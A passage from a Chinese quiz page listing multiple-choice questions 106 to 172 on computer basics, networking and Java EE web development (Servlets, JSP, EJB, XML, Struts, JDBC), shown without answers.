体系结构定义了一个几层模型。"></a>106.OSI 体系结构定义了一个几层模型。</h3><blockquote><p><strong>A 6</strong><br><strong>B 7</strong><br><strong>C 8</strong></p></blockquote><h3 id="107-以下哪个命令用于测试网络连通。"><a href="#107-以下哪个命令用于测试网络连通。" class="headerlink" title="107.以下哪个命令用于测试网络连通。"></a>107.以下哪个命令用于测试网络连通。</h3><blockquote><p><strong>A telnet</strong><br><strong>B netstat</strong><br><strong>C ping</strong><br><strong>D ftp</strong></p></blockquote><h3 id="108-在一个办公室内，将-6-台计算机用交换机连接成网络，该网络的屋里拓扑结构为"><a href="#108-在一个办公室内，将-6-台计算机用交换机连接成网络，该网络的屋里拓扑结构为" class="headerlink" title="108.在一个办公室内，将 6 台计算机用交换机连接成网络，该网络的屋里拓扑结构为"></a>108.在一个办公室内，将 6 台计算机用交换机连接成网络，该网络的屋里拓扑结构为</h3><blockquote><p><strong>A 星型</strong><br><strong>B 总线型</strong><br><strong>C 树型</strong><br><strong>D 环型</strong></p></blockquote><h3 id="109-下列既可用作输入设备又可用作输出设备的是。"><a href="#109-下列既可用作输入设备又可用作输出设备的是。" class="headerlink" title="109.下列既可用作输入设备又可用作输出设备的是。"></a>109.下列既可用作输入设备又可用作输出设备的是。</h3><blockquote><p><strong>A 鼠标器</strong><br><strong>B 磁盘</strong><br><strong>C 键盘</strong><br><strong>D 显示器</strong></p></blockquote><h3 id="110-计算机的电源切断之后，存储内容全部消失的存储器是。"><a href="#110-计算机的电源切断之后，存储内容全部消失的存储器是。" class="headerlink" title="110.计算机的电源切断之后，存储内容全部消失的存储器是。"></a>110.计算机的电源切断之后，存储内容全部消失的存储器是。</h3><blockquote><p><strong>A 软磁盘</strong><br><strong>B 只读存储器</strong><br><strong>C 硬盘</strong><br><strong>D 随机存储器</strong></p></blockquote><h3 id="111-中央处理单元（CPU）的两个主要组成部分是运算器和什么。"><a href="#111-中央处理单元（CPU）的两个主要组成部分是运算器和什么。" class="headerlink" title="111.中央处理单元（CPU）的两个主要组成部分是运算器和什么。"></a>111.中央处理单元（CPU）的两个主要组成部分是运算器和什么。</h3><blockquote><p><strong>A 寄存器</strong><br><strong>B 主存储器</strong><br><strong>C 控制器</strong><br><strong>D 辅助存储器</strong></p></blockquote><h3 id="112-网上”黑客”是指什么样的用户。"><a href="#112-网上”黑客”是指什么样的用户。" class="headerlink" title="112.网上”黑客”是指什么样的用户。"></a>112.网上”黑客”是指什么样的用户。</h3><blockquote><p><strong>A 匿名上网;</strong><br><strong>B 总在晚上上网;</strong><br><strong>C 在网上私闯他人计算机系统;</strong><br><strong>D 不花钱上网;</strong></p></blockquote><h3 id="113-防火墙系统的主要作用是。"><a href="#113-防火墙系统的主要作用是。" class="headerlink" title="113.防火墙系统的主要作用是。"></a>113.防火墙系统的主要作用是。</h3><blockquote><p><strong>A 防止系统崩溃</strong><br><strong>B 防病毒</strong><br><strong>C 保护内部网络安全</strong><br><strong>D 预防火灾</strong></p></blockquote><h3 id="114-下列说法中哪项是错误的是。"><a href="#114-下列说法中哪项是错误的是。" class="headerlink" title="114.下列说法中哪项是错误的是。"></a>114.下列说法中哪项是错误的是。</h3><blockquote><p><strong>A 不同 CPU 的计算机有不同的机器语言和汇编语言；</strong><br><strong>B 回收站是硬盘中的一块区域，而剪贴板是内存中的一块区域；</strong><br><strong>C 在 Dos 中可以用的文件名在 windows 98 中一定可用；</strong><br><strong>D 计算机病毒不可能会驻留在 BIOS 中。</strong></p></blockquote><h3 id="115-用于电子邮件的协议是。"><a href="#115-用于电子邮件的协议是。" class="headerlink" title="115.用于电子邮件的协议是。"></a>115.用于电子邮件的协议是。</h3><blockquote><p>**A IP **<br><strong>B TCP</strong><br><strong>C SNMP</strong><br><strong>D SMTP</strong></p></blockquote><h3 id="116-Java-网络程序设计中-下列正确的描述是"><a href="#116-Java-网络程序设计中-下列正确的描述是" class="headerlink" title="116.Java 网络程序设计中,下列正确的描述是"></a>116.Java 网络程序设计中,下列正确的描述是</h3><blockquote><p><strong>A Java 网络编程 API 建立在 Socket 基础之上</strong><br><strong>B Java 网络接口只支持 TCP 以及其上层协议</strong><br><strong>C Java 网络接口只支持 UDP 以及其上层协议</strong><br><strong>D Java 网络接口支持 IP 以上的所有高层协议</strong></p></blockquote><h3 id="117-序列图描述对象是如何交互的并且将重点放在消息序列上。"><a href="#117-序列图描述对象是如何交互的并且将重点放在消息序列上。" class="headerlink" title="117.序列图描述对象是如何交互的并且将重点放在消息序列上。"></a>117.序列图描述对象是如何交互的并且将重点放在消息序列上。</h3><blockquote><p><strong>A 正确 B 不正确</strong></p></blockquote><h3 id="118-一个-XML-必须有-DTD-或-Schemas。"><a href="#118-一个-XML-必须有-DTD-或-Schemas。" class="headerlink" title="118.一个 XML 必须有 DTD 或 Schemas。"></a>118.一个 XML 必须有 DTD 或 Schemas。</h3><blockquote><p><strong>A 正确 B 不正确</strong></p></blockquote><h3 id="119-下列哪些是-J2EE-的体系。"><a href="#119-下列哪些是-J2EE-的体系。" class="headerlink" title="119.下列哪些是 J2EE 的体系。"></a>119.下列哪些是 J2EE 的体系。</h3><blockquote><p><strong>A JSP</strong><br><strong>B JAVA</strong><br><strong>C Servlet</strong><br><strong>D WebService</strong></p></blockquote><h3 id="120-在-Struts-中实现页面跳转主要通过什么方法来实现？"><a href="#120-在-Struts-中实现页面跳转主要通过什么方法来实现？" class="headerlink" title="120.在 Struts 中实现页面跳转主要通过什么方法来实现？"></a>120.在 Struts 中实现页面跳转主要通过什么方法来实现？</h3><blockquote><p><strong>A server.transfer</strong><br><strong>B response.redirect</strong><br><strong>C mapping.findForward</strong><br><strong>D response.sendRedirect</strong></p></blockquote><h3 id="121-EJB-的优点有哪些？"><a href="#121-EJB-的优点有哪些？" class="headerlink" title="121.EJB 的优点有哪些？"></a>121.EJB 的优点有哪些？</h3><blockquote><p>**A 技术领先 **<br>**B 价格低廉 **<br>**C 性能优越 **<br><strong>D 强大的容器支持</strong></p></blockquote><h3 id="122-以下哪些接口能够实现对-Web-访问者的身份认证？"><a href="#122-以下哪些接口能够实现对-Web-访问者的身份认证？" class="headerlink" title="122.以下哪些接口能够实现对 Web 访问者的身份认证？"></a>122.以下哪些接口能够实现对 Web 访问者的身份认证？</h3><blockquote><p><strong>A Http Servlet Request</strong><br><strong>B Http Servlet Response</strong><br><strong>C Http Session</strong><br><strong>D Http Servlet</strong></p></blockquote><h3 id="123-无状态会话-Bean、有状态会话-Bean、CMP-与-BMP-中，哪一种-Bean-不需要自己书写连接数据库的代码？"><a href="#123-无状态会话-Bean、有状态会话-Bean、CMP-与-BMP-中，哪一种-Bean-不需要自己书写连接数据库的代码？" class="headerlink" title="123.无状态会话 Bean、有状态会话 Bean、CMP 与 BMP 中，哪一种 Bean 不需要自己书写连接数据库的代码？"></a>123.无状态会话 Bean、有状态会话 Bean、CMP 与 BMP 中，哪一种 Bean 不需要自己书写连接数据库的代码？</h3><blockquote><p><strong>A 无状态会话 Bean</strong><br><strong>B 有状态会话 Bean</strong><br><strong>C CMP</strong><br><strong>D BMP</strong></p></blockquote><h3 id="124-假设-web-应用的文档根目录为-MyApp，那么可以从哪里找到-database-jar-文件。"><a href="#124-假设-web-应用的文档根目录为-MyApp，那么可以从哪里找到-database-jar-文件。" class="headerlink" title="124.假设 web 应用的文档根目录为 MyApp，那么可以从哪里找到 database.jar 文件。"></a>124.假设 web 应用的文档根目录为 MyApp，那么可以从哪里找到 database.jar 文件。</h3><blockquote><p><strong>A MyApp 目录下</strong><br><strong>B MyApp\images 目录下</strong><br><strong>C MyApp\WEB-INF 目录下</strong><br><strong>D MyApp\WEB-INF\lib 目录下</strong></p></blockquote><h3 id="125-从以下哪一个选项中可以获得-Servlet-的初始化参数。"><a href="#125-从以下哪一个选项中可以获得-Servlet-的初始化参数。" class="headerlink" title="125.从以下哪一个选项中可以获得 Servlet 的初始化参数。"></a>125.从以下哪一个选项中可以获得 Servlet 的初始化参数。</h3><blockquote><p><strong>A Servlet</strong><br><strong>B ServletContext</strong><br><strong>C ServletConfig</strong><br><strong>D GenericServlet</strong></p></blockquote><h3 id="126-哪一个对象可以用于获得浏览器发送的请求。"><a href="#126-哪一个对象可以用于获得浏览器发送的请求。" class="headerlink" title="126.哪一个对象可以用于获得浏览器发送的请求。"></a>126.哪一个对象可以用于获得浏览器发送的请求。</h3><blockquote><p><strong>A HttpServletRequest</strong><br><strong>B HttpServletResponse</strong><br><strong>C HttpServlet</strong><br><strong>D Http</strong></p></blockquote><h3 id="127-运行-jsp-需要安装-Web-服务器。"><a href="#127-运行-jsp-需要安装-Web-服务器。" class="headerlink" title="127.运行 jsp 需要安装_______Web 服务器。"></a>127.运行 jsp 需要安装_______Web 服务器。</h3><blockquote><p><strong>A Apache</strong><br><strong>B tomcat</strong><br><strong>C WebLogic</strong><br><strong>D IIS</strong></p></blockquote><h3 id="128-如何取得数据源。"><a href="#128-如何取得数据源。" class="headerlink" title="128.如何取得数据源。"></a>128.如何取得数据源。</h3><blockquote><p><strong>A 通过 Http</strong><br><strong>B 通过 ftp</strong><br><strong>C JNDI</strong><br><strong>D 通过 Connection 对象</strong></p></blockquote><h3 id="129-下列哪一个接口定义了用于查找、创建和删除-EJB-实例"><a href="#129-下列哪一个接口定义了用于查找、创建和删除-EJB-实例" class="headerlink" title="129.下列哪一个接口定义了用于查找、创建和删除 EJB 实例"></a>129.下列哪一个接口定义了用于查找、创建和删除 EJB 实例</h3><blockquote><p><strong>A Home</strong><br><strong>B Remote</strong><br><strong>C Local</strong><br><strong>D Message</strong></p></blockquote><h3 id="130．在服务器的网络编程中，解决会话跟踪的方法有："><a href="#130．在服务器的网络编程中，解决会话跟踪的方法有：" class="headerlink" title="130．在服务器的网络编程中，解决会话跟踪的方法有："></a>130．在服务器的网络编程中，解决会话跟踪的方法有：</h3><blockquote><p><strong>A 使用 Cookie。</strong><br><strong>B 使用 URL 重写。</strong><br><strong>C 使用隐藏的表单域。</strong><br><strong>D 以上方法都不能单独使用。</strong></p></blockquote><h3 id="131-与-HttpSessionListener-接口有关的方法是。"><a href="#131-与-HttpSessionListener-接口有关的方法是。" class="headerlink" title="131.与 HttpSessionListener 接口有关的方法是。"></a>131.与 HttpSessionListener 接口有关的方法是。</h3><blockquote><p><strong>A sessionInitialized()</strong><br><strong>B sessionCreated()</strong><br><strong>C sessionFinialized()</strong><br><strong>D sessionDestroyed()</strong></p></blockquote><h3 id="132-关于-JSP-生命周期的叙述，下列哪些为真？"><a href="#132-关于-JSP-生命周期的叙述，下列哪些为真？" class="headerlink" title="132.关于 JSP 生命周期的叙述，下列哪些为真？"></a>132.关于 JSP 生命周期的叙述，下列哪些为真？</h3><blockquote><p><strong>A JSP 会先解释成 Servlet 源文件，然后编译成 Servlet 类文件</strong><br><strong>B 每当用户端运行 JSP 时，jspInit()方法都会运行一次</strong><br><strong>C 每当用户端运行 JSP 时，_jspService()方法都会运行一次</strong><br><strong>D 每当用户端运行 JSP 时，jspDestroy()方法都会运行一次</strong></p></blockquote><h3 id="133-以下声明正确的是。"><a href="#133-以下声明正确的是。" class="headerlink" title="133.以下声明正确的是。"></a>133.以下声明正确的是。</h3><blockquote><p><strong>A <xml-stylesheet type="txt/css" href="abc.css"></xml-stylesheet></strong><br><strong>B <!--?xml-stylesheet type='txt/css' href='abc.css'?--></strong><br><strong>C <!--?xml-stylesheet type="txt/css" href="abc.css"?--></strong><br><strong>D &lt;%xml-stylesheet type=”txt/css” href=”abc.css”%&gt;</strong></p></blockquote><h3 id="134-下列哪个为-JSP-的隐含对象。"><a href="#134-下列哪个为-JSP-的隐含对象。" class="headerlink" title="134.下列哪个为 JSP 的隐含对象。"></a>134.下列哪个为 JSP 的隐含对象。</h3><blockquote><p><strong>A env</strong><br><strong>B page</strong><br><strong>C jspinfo</strong><br><strong>D context</strong></p></blockquote><h3 id="135-下面的那一个不属于-MVC-模式中的对象？"><a href="#135-下面的那一个不属于-MVC-模式中的对象？" class="headerlink" title="135.下面的那一个不属于 MVC 模式中的对象？"></a>135.下面的那一个不属于 MVC 模式中的对象？</h3><blockquote><p><strong>A Model</strong><br><strong>B View</strong><br><strong>C Collection</strong><br><strong>D Controller</strong></p></blockquote><h3 id="136-要创建一个-EJB，必须要至少编写哪些-Java-类和接口？"><a href="#136-要创建一个-EJB，必须要至少编写哪些-Java-类和接口？" class="headerlink" title="136.要创建一个 EJB，必须要至少编写哪些 Java 类和接口？"></a>136.要创建一个 EJB，必须要至少编写哪些 Java 类和接口？</h3><blockquote><p><strong>A 定义远程(或业务)接口</strong><br><strong>B 定义本地接口</strong><br><strong>C 定义 Bean 接口</strong><br><strong>D 编写 Bean 的实现</strong></p></blockquote><h3 id="137-XML-是一种元语言-可以用它来描述其他语言。"><a href="#137-XML-是一种元语言-可以用它来描述其他语言。" class="headerlink" title="137.XML 是一种元语言, 可以用它来描述其他语言。"></a>137.XML 是一种元语言, 可以用它来描述其他语言。</h3><blockquote><p><strong>A 正确</strong><br><strong>B 错误</strong></p></blockquote><h3 id="138-类图用来表示系统中类和类与类之间的关系，它是对系统动态结构的描述。"><a href="#138-类图用来表示系统中类和类与类之间的关系，它是对系统动态结构的描述。" class="headerlink" title="138.类图用来表示系统中类和类与类之间的关系，它是对系统动态结构的描述。"></a>138.类图用来表示系统中类和类与类之间的关系，它是对系统动态结构的描述。</h3><blockquote><p><strong>A 正确</strong><br><strong>B 不正确</strong></p></blockquote><h3 id="139-哪一个不是-EL-定义的隐式对象？"><a href="#139-哪一个不是-EL-定义的隐式对象？" class="headerlink" title="139.哪一个不是 EL 定义的隐式对象？"></a>139.哪一个不是 EL 定义的隐式对象？</h3><blockquote><p><strong>A cookie</strong><br><strong>B pageContext</strong><br><strong>C attributes</strong><br><strong>D initParam</strong></p></blockquote><h3 id="140-下面哪些属于-JSTL-中的表达式操作标签。"><a href="#140-下面哪些属于-JSTL-中的表达式操作标签。" class="headerlink" title="140.下面哪些属于 JSTL 中的表达式操作标签。"></a>140.下面哪些属于 JSTL 中的表达式操作标签。</h3><blockquote><p><strong>A <code>&lt;c:out&gt;</code></strong><br><strong>B <code>&lt;c:if&gt;</code></strong><br><strong>C <code>&lt;c:url&gt;</code></strong><br><strong>D <code>&lt;c:catch&gt;</code></strong></p></blockquote><h3 id="141-Struts-框架可以支持以下哪种程序开发语言？"><a href="#141-Struts-框架可以支持以下哪种程序开发语言？" class="headerlink" title="141.Struts 框架可以支持以下哪种程序开发语言？"></a>141.Struts 框架可以支持以下哪种程序开发语言？</h3><blockquote><p><strong>A C</strong><br><strong>B C++</strong><br><strong>C Java</strong><br><strong>D C#</strong></p></blockquote><h3 id="142-在-Servlet-处理请求的方式为。"><a href="#142-在-Servlet-处理请求的方式为。" class="headerlink" title="142.在 Servlet 处理请求的方式为。"></a>142.在 Servlet 处理请求的方式为。</h3><blockquote><p><strong>A 以进程的方式</strong><br><strong>B 以程序的方式</strong><br><strong>C 以线程的方式</strong><br><strong>D 以响应的方式</strong></p></blockquote><h3 id="143-javax-Servlet-的包中，属于类的是。"><a href="#143-javax-Servlet-的包中，属于类的是。" class="headerlink" title="143.javax.Servlet 的包中，属于类的是。"></a>143.javax.Servlet 的包中，属于类的是。</h3><blockquote><p><strong>A Servlet</strong><br><strong>B GenericServlet</strong><br><strong>C ServletRequest</strong><br><strong>D ServletContext</strong></p></blockquote><h3 id="144-以下说法正确的是。"><a href="#144-以下说法正确的是。" class="headerlink" title="144.以下说法正确的是。"></a>144.以下说法正确的是。</h3><blockquote><p><strong>A #CDATA 标记表示该元素包含的数据将被解析器解释</strong><br><strong>B #PCDATA 标记表示该元素包含的数据将不被解析器解释</strong><br><strong>C #PCDATA 标记表示该元素包含的数据将被解析器解释</strong><br><strong>D #CDATA 标记表示该元素包含的数据将不被解析器解释</strong></p></blockquote><h3 id="145-Http-缺省的请求方法是。"><a href="#145-Http-缺省的请求方法是。" class="headerlink" title="145.Http 缺省的请求方法是。"></a>145.Http 缺省的请求方法是。</h3><blockquote><p><strong>A PUT</strong><br><strong>B GET</strong><br><strong>C POST</strong><br><strong>D TRACE</strong></p></blockquote><h3 id="146-在-XML-中用于注释的符号是。"><a href="#146-在-XML-中用于注释的符号是。" class="headerlink" title="146.在 XML 中用于注释的符号是。"></a>146.在 XML 中用于注释的符号是。</h3><blockquote><p><strong>A <code>&lt;!-- --&gt;</code></strong><br><strong>B <code>&lt;?-- --?&gt;</code></strong><br><strong>C <code>&lt;% %&gt;</code></strong><br><strong>D <code>&lt;!-- --!&gt;</code></strong></p></blockquote><h3 id="147-DTD-与-XML-Schema-都是-XML-文档。"><a href="#147-DTD-与-XML-Schema-都是-XML-文档。" class="headerlink" title="147.DTD 与 XML Schema 都是 XML 文档。"></a>147.DTD 与 XML Schema 都是 XML 文档。</h3><blockquote><p><strong>A 正确</strong><br><strong>B 不正确</strong></p></blockquote><h3 id="148-JDBC-中，用于表示数据库连接的对象是。"><a href="#148-JDBC-中，用于表示数据库连接的对象是。" class="headerlink" title="148.JDBC 中，用于表示数据库连接的对象是。"></a>148.JDBC 中，用于表示数据库连接的对象是。</h3><blockquote><p><strong>A Statement</strong><br><strong>B Connection</strong><br><strong>C DriverManager</strong><br><strong>D PreparedStatement</strong></p></blockquote><h3 id="149-用于调用存储过程的对象是。"><a href="#149-用于调用存储过程的对象是。" class="headerlink" title="149.用于调用存储过程的对象是。"></a>149.用于调用存储过程的对象是。</h3><blockquote><p><strong>A ResultSet</strong><br><strong>B DriverManager</strong><br><strong>C CallableStatemet</strong><br><strong>D PreparedStatement</strong></p></blockquote><h3 id="150-如果没有指定-Cookie-的时效，那么默认的时效是。"><a href="#150-如果没有指定-Cookie-的时效，那么默认的时效是。" class="headerlink" title="150.如果没有指定 Cookie 的时效，那么默认的时效是。"></a>150.如果没有指定 Cookie 的时效，那么默认的时效是。</h3><blockquote><p><strong>A 一天</strong><br><strong>B 永不过期</strong><br><strong>C 会话级别</strong><br><strong>D 一分钟</strong></p></blockquote><h3 id="151"><a href="#151" class="headerlink" title="151."></a>151.</h3><pre><code>&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;!ELEMENT Customer EMPTY&gt;&lt;!ATTLIST Customer 称呼 CDATA #IMPLIED 姓名 CDATA #REQUIRED 职位 CDATA #REQUIRED&gt;</code></pre><p>关于上述 DTD 定义的描述正确的是。</p><blockquote><p><strong>A Customer 元素能包含子元素，并且能为空</strong><br><strong>B Customer 元素能包含文本，并且能为空</strong><br><strong>C Customer 元素不能包含文本，也不能包含子元素</strong><br><strong>D Customer 元素的所有实例的”称呼”属性必须有值，不能为空</strong></p></blockquote><h3 id="152-实现现下列哪一种接口的对象，并不需要在-web-xml-文件内进行额外的设定，Servlet-容器就能够回应该对象加入-HTTP-会话所发生的事件？"><a href="#152-实现现下列哪一种接口的对象，并不需要在-web-xml-文件内进行额外的设定，Servlet-容器就能够回应该对象加入-HTTP-会话所发生的事件？" class="headerlink" title="152.实现现下列哪一种接口的对象，并不需要在 web.xml 文件内进行额外的设定，Servlet 容器就能够回应该对象加入 HTTP 会话所发生的事件？"></a>152.实现现下列哪一种接口的对象，并不需要在 web.xml 文件内进行额外的设定，Servlet 容器就能够回应该对象加入 HTTP 会话所发生的事件？</h3><blockquote><p><strong>A ServletContextListener</strong><br><strong>B HttpSessionListener</strong><br><strong>C HttpSessionAttributeListener</strong><br><strong>D HttpSessionBindingListener</strong></p></blockquote><h3 id="153-下列哪个为-JSP-的小脚本的标签？"><a href="#153-下列哪个为-JSP-的小脚本的标签？" class="headerlink" title="153.下列哪个为 JSP 的小脚本的标签？"></a>153.下列哪个为 JSP 的小脚本的标签？</h3><blockquote><p><strong>A &lt;% %&gt;</strong><br><strong>B &lt;@ %&gt;</strong><br><strong>C &lt;%! %&gt;</strong><br><strong>D &lt;%– %&gt;</strong></p></blockquote><h3 id="154-以下不属于-JSP-的标准指令的是。"><a href="#154-以下不属于-JSP-的标准指令的是。" class="headerlink" title="154.以下不属于 JSP 的标准指令的是。"></a>154.以下不属于 JSP 的标准指令的是。</h3><blockquote><p><strong>A Taglib</strong><br><strong>B Include</strong><br><strong>C Import</strong><br><strong>D Page</strong></p></blockquote><h3 id="155-对于每一个网站访问用户都要访问的变量，应该将它设为-变量。"><a href="#155-对于每一个网站访问用户都要访问的变量，应该将它设为-变量。" class="headerlink" title="155.对于每一个网站访问用户都要访问的变量，应该将它设为________变量。"></a>155.对于每一个网站访问用户都要访问的变量，应该将它设为________变量。</h3><blockquote><p><strong>A Session</strong><br><strong>B Reques</strong><br><strong>C Response</strong><br><strong>D Application</strong></p></blockquote><h3 id="156-EJB-类库存在于-Java-的哪个版本中？"><a href="#156-EJB-类库存在于-Java-的哪个版本中？" class="headerlink" title="156.EJB 类库存在于 Java 的哪个版本中？"></a>156.EJB 类库存在于 Java 的哪个版本中？</h3><blockquote><p><strong>A J2SE</strong><br><strong>B J2EE</strong><br><strong>C J2ME</strong><br><strong>D J2NE</strong></p></blockquote><h3 id="157．察看下列-JSP-内容"><a href="#157．察看下列-JSP-内容" class="headerlink" title="157．察看下列 JSP 内容"></a>157．察看下列 JSP 内容</h3><pre><code>&lt;html&gt;&lt;body&gt;&lt;% for (int i=0;i&lt;3;i++){ %&gt;out.print(i*2);&lt;% } %&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>当这个 JSP 被运行时，其结果是什么？</p><blockquote><p><strong>A 此 JSP 因为语法错误，无法运行</strong><br><strong>B 显示出 0，2，4</strong><br><strong>C 显示出 0，2，4，6</strong><br><strong>D 显示出 out.print(i<em>2) out.print(i</em>2) out.print(i*2)</strong></p></blockquote><h3 id="158-假设-A-jsp-内设定一个jsp-useBean元素："><a href="#158-假设-A-jsp-内设定一个jsp-useBean元素：" class="headerlink" title="158 假设 A jsp 内设定一个jsp:useBean元素："></a>158 假设 A jsp 内设定一个<a href="jsp:useBean">jsp:useBean</a>元素：</h3><pre><code>&lt;jsp:useBean id="bean1" class="myBean" /&gt;</code></pre><p>下列哪一个为真？</p><blockquote><p><strong>A bean1 的存取范围（scope）默认为 application</strong><br><strong>B 在 HTTP 会话内可以存取 bean1</strong><br><strong>C 只有在 A jsp 内可以存取 bean1</strong><br><strong>D 在 A jsp 所属的 Web 应用程序内均可存取 bean1</strong></p></blockquote><h3 id="159-在-MVC-设计模式中，JavaBean-的作用是。"><a href="#159-在-MVC-设计模式中，JavaBean-的作用是。" class="headerlink" title="159 在 MVC 设计模式中，JavaBean 的作用是。"></a>159 在 MVC 设计模式中，JavaBean 的作用是。</h3><blockquote><p><strong>A Controller</strong><br><strong>B Model</strong><br><strong>C 业务数据的封装</strong><br><strong>D View</strong></p></blockquote><h3 id="160-在-J2EE-中属于-Web-层的组件有"><a href="#160-在-J2EE-中属于-Web-层的组件有" class="headerlink" title="160 在 J2EE 中属于 Web 层的组件有"></a>160 在 J2EE 中属于 Web 层的组件有</h3><blockquote><p><strong>A HTML</strong><br><strong>B EJB</strong><br><strong>C Applet</strong><br><strong>D JSP</strong></p></blockquote><h3 id="161-单元测试是在软件开发过程中的哪个阶段完成的？"><a href="#161-单元测试是在软件开发过程中的哪个阶段完成的？" class="headerlink" title="161 单元测试是在软件开发过程中的哪个阶段完成的？"></a>161 单元测试是在软件开发过程中的哪个阶段完成的？</h3><blockquote><p><strong>A 可行性研究和计划</strong><br><strong>B 概要设计</strong><br><strong>C 实现</strong><br><strong>D 使用和维护</strong></p></blockquote><h3 id="162-在-J2EE-的-Web-应用中，编译后的-class-文件存放的目录为"><a href="#162-在-J2EE-的-Web-应用中，编译后的-class-文件存放的目录为" class="headerlink" title="162 在 J2EE 的 Web 应用中，编译后的 class 文件存放的目录为"></a>162 在 J2EE 的 Web 应用中，编译后的 class 文件存放的目录为</h3><blockquote><p><strong>A classes 目录</strong><br><strong>B images 目录</strong><br><strong>C jar 目录</strong><br><strong>D 任意位置</strong></p></blockquote><h3 id="163-HttpServlet-中，用来处理-POST-请求的方法是"><a href="#163-HttpServlet-中，用来处理-POST-请求的方法是" class="headerlink" title="163 HttpServlet 中，用来处理 POST 请求的方法是"></a>163 HttpServlet 中，用来处理 POST 请求的方法是</h3><blockquote><p><strong>A doHead</strong><br><strong>B doGet</strong><br><strong>C doPost</strong><br><strong>D doPut</strong></p></blockquote><h3 id="164-DOM-中-XMLDOMnodelist-的-length-属性的表示是："><a href="#164-DOM-中-XMLDOMnodelist-的-length-属性的表示是：" class="headerlink" title="164.DOM 中 XMLDOMnodelist 的 length 属性的表示是："></a>164.DOM 中 XMLDOMnodelist 的 length 属性的表示是：</h3><blockquote><p><strong>A 该对象中文本字符的长度</strong><br><strong>B 该对象中元素节点的数量</strong><br><strong>C 该对象中节点的数量</strong><br><strong>D 该对象中文档对象的数量</strong></p></blockquote><h3 id="165-如何创建-Cookie"><a href="#165-如何创建-Cookie" class="headerlink" title="165.如何创建 Cookie?"></a>165.如何创建 Cookie?</h3><blockquote><p><strong>A 使用 new Cookie 语句</strong><br><strong>B 调用 response.addCookie 方法</strong><br><strong>C 使用 Cookie 的 setMaxAge 方法</strong><br><strong>D setCookie 方法</strong></p></blockquote><h3 id="166-关于-Web-应用程序，下列说法错误的是（-）。"><a href="#166-关于-Web-应用程序，下列说法错误的是（-）。" class="headerlink" title="166. 关于 Web 应用程序，下列说法错误的是（ ）。"></a>166. 关于 Web 应用程序，下列说法错误的是（ ）。</h3><blockquote><p><strong>A WEB-INF 目录存在于 web 应用的根目录下</strong><br><strong>B WEB-INF 目录与 classes 目录平行</strong><br><strong>C web.xml 在 WEB-INF 目录下</strong><br><strong>D Web 应用程序可以打包为 war 文件</strong></p></blockquote><h3 id="167-有关-Servlet-的生命周期说法正确的有（-）。"><a href="#167-有关-Servlet-的生命周期说法正确的有（-）。" class="headerlink" title="167 有关 Servlet 的生命周期说法正确的有（ ）。"></a>167 有关 Servlet 的生命周期说法正确的有（ ）。</h3><blockquote><p><strong>A Servlet 的生命周期由 Servlet 实例控制</strong><br><strong>B init()方法在创建完 Servlet 实例后对其进行初始化，传递的参数为实现<br>ServletContext 接口的对象</strong><br><strong>C service()方法响应客户端发出的请求</strong><br><strong>D destroy()方法释放 Servlet 实例</strong></p></blockquote><h3 id="168．以下-web-xml-片断（-）正确地声明-servlet-上下文参数。"><a href="#168．以下-web-xml-片断（-）正确地声明-servlet-上下文参数。" class="headerlink" title="168．以下 web.xml 片断（ ）正确地声明 servlet 上下文参数。"></a>168．以下 web.xml 片断（ ）正确地声明 servlet 上下文参数。</h3><p>A</p><pre><code>&lt;init-param&gt;&lt;param-name&gt;MAX&lt;/param-name&gt;&lt;param-value&gt;100&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>B</p><pre><code>&lt;context-param&gt;&lt;param name="MAX" value="100" /&gt;&lt;context-param&gt;</code></pre><p>C</p><pre><code>&lt;context&gt;&lt;param name="MAX" value="100" /&gt;&lt;context&gt;</code></pre><p>D</p><pre><code>&lt;context-param&gt;&lt;param-name&gt;MAX&lt;/param-name&gt;&lt;param-value&gt;100&lt;/param-value&gt;&lt;context-param&gt;**</code></pre><h3 id="169-以下（-）可用于检索-session-属性-userid-的值。"><a href="#169-以下（-）可用于检索-session-属性-userid-的值。" class="headerlink" title="169.以下（ ）可用于检索 session 属性 userid 的值。"></a>169.以下（ ）可用于检索 session 属性 userid 的值。</h3><blockquote><p><strong>A session. getAttribute (“userid”);</strong><br><strong>B session. setAttribute (“userid”);</strong><br><strong>C request. getParameter (“userid”);</strong><br><strong>D request. getAttribute (“userid”);</strong></p></blockquote><h3 id="170．下列-JSP-代码："><a href="#170．下列-JSP-代码：" class="headerlink" title="170．下列 JSP 代码："></a>170．下列 JSP 代码：</h3><pre><code>&lt;html&gt;    &lt;body&gt;        &lt;%         for(int i = 0; i &lt; 10; i++) {        //1        }        %&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>以下（ ）可放置在//1 处，不会发生编译错误。</p><blockquote><p><strong>A <code>&lt;%= i %&gt;</code></strong><br><strong>B <code>&lt;b&gt;i&lt;/b&gt;</code></strong><br><strong>C <code>%&gt;&lt;%= i %&gt;&lt;%</code></strong><br><strong>D 不写任何内容</strong></p></blockquote><h3 id="171-考虑下面两个-JSP-文件代码片断："><a href="#171-考虑下面两个-JSP-文件代码片断：" class="headerlink" title="171.考虑下面两个 JSP 文件代码片断："></a>171.考虑下面两个 JSP 文件代码片断：</h3><p>test1.jsp:</p><pre><code>&lt;HTML&gt;    &lt;BODY&gt;        &lt;% pageContext.setAttribute("ten",new Integer(10));%&gt;        //1    &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>test2.jsp:</p><pre><code>数字为：&lt;%= pageContext.getAttribute("ten")%&gt;</code></pre><p>以下（ ）放置在 test1.jsp 中的//1 处，当请求 test1.jsp 时正确输出 test2.jsp 中的内容。</p><blockquote><p><strong>A <code>&lt;jsp:include page="test2.jsp" /&gt;</code></strong><br><strong>B <code>&lt;jsp:forword page="test2.jsp" /&gt;</code></strong><br><strong>C <code>&lt;%@ include file="test2.jsp" %&gt;</code></strong><br><strong>D 由于 pageContext 对象的 scope 属性为 page,所以 test2.jsp 不能访问 test1.jsp 定义的属性</strong></p></blockquote><h3 id="172-有关-JSP-隐式对象，以下（-）描述正确。"><a href="#172-有关-JSP-隐式对象，以下（-）描述正确。" class="headerlink" title="172.有关 JSP 隐式对象，以下（ ）描述正确。"></a>172.有关 JSP 隐式对象，以下（ ）描述正确。</h3><blockquote><p><strong>A 隐式对象是 WEB 容器加载的一组类的实例，可以直接在 JSP 页面使用</strong><br><strong>B 不能通过 config 对象获取 ServletContext 对象</strong><br><strong>C response 对象通过 sendRedirect 方法实现重定向</strong><br><strong>D 只有在出错处理页面才有 exception 